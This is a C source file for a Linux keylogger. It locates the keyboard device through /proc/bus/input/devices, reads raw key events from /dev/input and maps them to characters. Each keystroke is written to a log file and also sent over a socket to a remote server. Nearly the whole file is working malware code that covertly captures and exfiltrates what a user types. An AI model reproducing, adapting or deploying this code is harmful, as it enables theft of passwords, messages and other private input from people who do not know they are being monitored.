#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "keylogger.h"
#include "interproccess.h"

#define BUFFER_SIZE 512

void capture_keys(FILE *file, char *event, int socket_desc, struct sockaddr_in server_addr)
{
	struct input_event ev;
	char path[255] = "/dev/input/";
	strcat(path, event);
	int fd = open(path, O_RDONLY);

	char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./... ";
	char message[2] = "0\0";

	while (1)
	{
		read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			if (ev.code == KEY_ESC)
			{
				fprintf(file, "ESC");
				send_to_server("ESC", socket_desc, server_addr);
			}
			else if (ev.code == KEY_ENTER)
			{
				fprintf(file, "\n");
				send_to_server("\n", socket_desc, server_addr);
			}

			else if (ev.code == KEY_BACKSPACE)
			{
				fprintf(file, "<=");
				send_to_server("<=", socket_desc, server_addr);
			}
			else
			{
				fprintf(file, "%c", map[ev.code]);
				message[0] = map[ev.code];
				send_to_server(message, socket_desc, server_addr);
			}
			fflush(file);
		}
	}

	close(socket_desc);
	close(fd);
}

char *find_keyboard()
{
	FILE *ptr;
	char line[BUFFER_SIZE];
	char *handlers_line;
	char *event;
	int i = -1;

	ptr = fopen("/proc/bus/input/devices", "r");

	while (fgets(line, BUFFER_SIZE, ptr))
	{

		if (i == 1)
		{

			if (strstr(line, "EV=120013") != NULL)
			{
				break;
			}
			else
			{
				i = -1;
			}
		}
		if (i == 2)
		{
			i--;
		}

		if (strstr(line, "Handlers") != NULL)
		{
			i = 2;
			handlers_line = strdup(line);
		}
	}
	fclose(ptr);

	event = strstr(handlers_line, "event");
	char *ans = strndup(event, 6);
	return ans;
}
